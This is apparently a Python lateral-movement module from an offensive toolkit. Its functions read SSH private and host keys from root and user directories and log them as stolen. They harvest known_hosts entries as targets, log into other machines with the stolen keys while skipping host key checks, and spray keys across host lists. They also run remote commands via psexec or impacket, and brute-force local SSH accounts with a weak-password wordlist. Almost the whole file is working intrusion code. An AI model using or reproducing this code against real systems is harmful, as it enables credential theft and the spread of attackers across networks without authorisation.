import base64
import os
import subprocess
from typing import Dict, List

from tools.log_utils import get_logger

logger = get_logger("lateral_move")


def steal_ssh_keys(exec_fn: callable) -> Dict:
    result = {"success": False, "keys": [], "hosts": [], "note": ""}
    ssh_paths = [
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.ssh/id_ecdsa",
        "/home/*/.ssh/id_rsa",
        "/home/*/.ssh/id_ed25519",
        "/home/*/.ssh/id_ecdsa",
        "/etc/ssh/ssh_host_rsa_key",
        "/etc/ssh/ssh_host_ed25519_key",
    ]
    known_hosts_paths = [
        "/root/.ssh/known_hosts",
        "/home/*/.ssh/known_hosts",
    ]

    for path_pattern in known_hosts_paths:
        try:
            r = exec_fn("cat %s 2>/dev/null | head -50" % path_pattern)
            out = r.get("output", "") if isinstance(r, dict) else str(r)
            for line in out.split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and " " in line:
                    host = line.split()[0]
                    if host not in result["hosts"]:
                        result["hosts"].append(host)
        except Exception:
            pass

    for path in ssh_paths:
        if "*" in path:
            try:
                r = exec_fn("ls -la " + path.replace("*", "") + " 2>/dev/null")
                out = r.get("output", "") if isinstance(r, dict) else str(r)
                if not out.strip():
                    continue
            except Exception:
                continue

        try:
            r = exec_fn("cat %s 2>/dev/null" % path)
            out = r.get("output", "") if isinstance(r, dict) else str(r)
            if "PRIVATE KEY" in out or "BEGIN " in out:
                entry = {"path": path, "key_type": _detect_key_type(out)}
                b64 = base64.b64encode(out.encode()).decode()
                entry["base64"] = b64[:80] + "..." if len(b64) > 80 else b64
                result["keys"].append(entry)
                logger.info("Stole SSH key: %s (%s)", path, entry["key_type"])
        except Exception:
            continue

    result["success"] = len(result["keys"]) > 0
    result["note"] = "Found %d keys, %d known hosts" % (len(result["keys"]), len(result["hosts"]))
    return result


def _detect_key_type(key_text: str) -> str:
    if "ED25519" in key_text or "ed25519" in key_text:
        return "ed25519"
    if "EC" in key_text or "ecdsa" in key_text:
        return "ecdsa"
    if "RSA" in key_text:
        return "rsa"
    if "OPENSSH" in key_text:
        return "openssh"
    if "PGP" in key_text:
        return "pgp"
    return "unknown"


def ssh_key_login(target_host: str, ssh_user: str, key_b64: str,
                   port: int = 22) -> Dict:
    result = {"success": False, "method": "ssh_key_login"}
    key_path = "/tmp/_lat_ssh_" + os.urandom(4).hex()
    try:
        key_data = base64.b64decode(key_b64).decode()
        with open(key_path, "w") as f:
            f.write(key_data)
        os.chmod(key_path, 0o600)
        cmd = ["ssh", "-i", key_path, "-o", "StrictHostKeyChecking=no",
               "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
               "%s@%s" % (ssh_user, target_host), "-p", str(port),
               "hostname;id;whoami"]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if r.returncode == 0:
            result["success"] = True
            result["output"] = r.stdout.strip()
            result["host"] = target_host
            result["user"] = ssh_user
        else:
            result["error"] = (r.stderr or "")[:200]
    except subprocess.TimeoutExpired:
        result["error"] = "timeout"
    except Exception as e:
        result["error"] = str(e)
    finally:
        try:
            os.unlink(key_path)
        except Exception:
            pass
    return result


def ssh_key_bruteforce_hosts(key_b64: str, username: str = "root",
                              host_list: List[str] = None,
                              ports: List[int] = None) -> List[Dict]:
    results = []
    ports = ports or [22]
    host_list = host_list or []
    for host in host_list:
        for port in ports:
            r = ssh_key_login(host, username, key_b64, port)
            if r["success"]:
                r["host"] = host
                r["port"] = port
                results.append(r)
                logger.info("SSH key login success: %s@%s:%d", username, host, port)
                break
    return results


def smb_exec_psexec(target_host: str, command: str,
                     username: str, password: str,
                     domain: str = ".") -> Dict:
    result = {"success": False, "method": "smb_psexec", "output": ""}

    if os.name == "nt":
        try:
            import subprocess
            cmd = ["psexec", "\\\\" + target_host, "-u", domain + "\\" + username,
                   "-p", password, "-h", "-s", "cmd.exe", "/c", command]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            result["success"] = r.returncode == 0
            result["output"] = (r.stdout or r.stderr or "")[:500]
        except Exception as e:
            result["error"] = str(e)
    else:
        try:
            import subprocess
            cmd = ["impacket-psexec", "%s/%s:%s@%s" % (domain, username, password, target_host), command]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            result["success"] = r.returncode == 0
            result["output"] = (r.stdout or r.stderr or "")[:500]
            result["method"] = "impacket_psexec"
        except FileNotFoundError:
            result["error"] = "impacket not installed"
        except Exception as e:
            result["error"] = str(e)
    return result


def crack_ssh_passwords(exec_fn: callable, wordlist: List[str] = None) -> Dict:
    result = {"success": False, "found": []}
    wordlist = wordlist or [
        "root", "admin", "123456", "password", "root123",
        "admin123", "toor", "Passw0rd", "P@ssw0rd", "changeme",
        "ubuntu", "debian", "centos", "raspberry", "pi",
    ]
    try:
        r = exec_fn("cat /etc/passwd 2>/dev/null | grep -E 'sh$' | cut -d: -f1")
        users_out = r.get("output", "") if isinstance(r, dict) else str(r)
        users = [u.strip() for u in users_out.split("\n") if u.strip()]
    except Exception:
        users = ["root"]

    for user in users:
        for pw in wordlist:
            try:
                r = subprocess.run(
                    ["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
                     "-o", "ConnectTimeout=3", "%s@localhost" % user, "id"],
                    capture_output=True, text=True, timeout=8,
                )
                if r.returncode == 0:
                    result["found"].append({"user": user, "password": pw})
                    logger.warning("Weak SSH password: %s:%s", user, pw)
            except Exception:
                continue

    result["success"] = len(result["found"]) > 0
    return result


def enum_ssh_config(exec_fn: callable) -> Dict:
    result = {"success": False, "configs": []}
    paths = [
        "/root/.ssh/config",
        "/etc/ssh/ssh_config",
        "/etc/ssh/sshd_config",
    ]
    for p in paths:
        try:
            r = exec_fn("cat %s 2>/dev/null" % p)
            out = r.get("output", "") if isinstance(r, dict) else str(r)
            if out.strip():
                result["configs"].append({"path": p, "content": out[:500]})
        except Exception:
            continue
    result["success"] = len(result["configs"]) > 0
    return result
